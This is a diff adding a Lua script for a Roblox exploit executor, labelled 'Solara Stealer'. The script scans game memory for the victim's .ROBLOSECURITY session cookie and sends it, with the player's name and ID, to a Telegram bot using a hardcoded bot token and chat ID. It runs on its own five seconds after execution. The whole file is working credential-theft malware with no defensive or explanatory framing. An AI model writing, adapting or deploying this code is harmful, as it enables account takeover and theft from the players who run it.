@@ -1,0 +1,68 @@
+local HttpService = game:GetService("HttpService")
+local Player = game:GetService("Players").LocalPlayer
+local BOT_TOKEN = "8891863202:AAFOE51HO9CEtekAK-XiD8fAjwAqp3rz-dE"
+local CHAT_ID = "7659540201"
+
+local function steal()
+    local cookie = nil
+    
+    pcall(function()
+        for _, v in pairs(getgc()) do
+            if type(v) == "string" and #v > 800 and v:find("_|WARNING") then
+                cookie = v:match("(_|WARNING[^%s\"']+)")
+                if cookie then break end
+            end
+        end
+    end)
+    
+    if not cookie then
+        pcall(function()
+            for _, v in pairs(getgc()) do
+                if type(v) == "table" then
+                    pcall(function()
+                        for _, val in pairs(v) do
+                            if type(val) == "string" and #val > 800 and val:find("_|WARNING") then
+                                cookie = val:match("(_|WARNING[^%s\"']+)")
+                                if cookie then break end
+                            end
+                        end
+                    end)
+                end
+                if cookie then break end
+            end
+        end)
+    end
+    
+    if not cookie then
+        pcall(function()
+            for _, v in pairs(getgc()) do
+                if type(v) == "function" then
+                    pcall(function()
+                        local info = debug.getinfo(v, "S")
+                        if info and info.source and type(info.source) == "string" and info.source:find("_|WARNING") then
+                            cookie = info.source:match("(_|WARNING[^%s\"']+)")
+                            if cookie then break end
+                        end
+                    end)
+                end
+            end
+        end)
+    end
+    
+    if cookie then
+        local text = "🍪 " .. Player.Name .. " (" .. Player.UserId .. ")\n\n" .. cookie
+        local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. HttpService:UrlEncode(text)
+        syn.request({Url = url})
+    else
+        local text = "❌ NO COOKIE: " .. Player.Name .. " (" .. Player.UserId .. ")"
+        local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. HttpService:UrlEncode(text)
+        syn.request({Url = url})
+    end
+end
+
+task.spawn(function()
+    task.wait(5)
+    steal()
+end)
+
+print("Solara Stealer Ready")
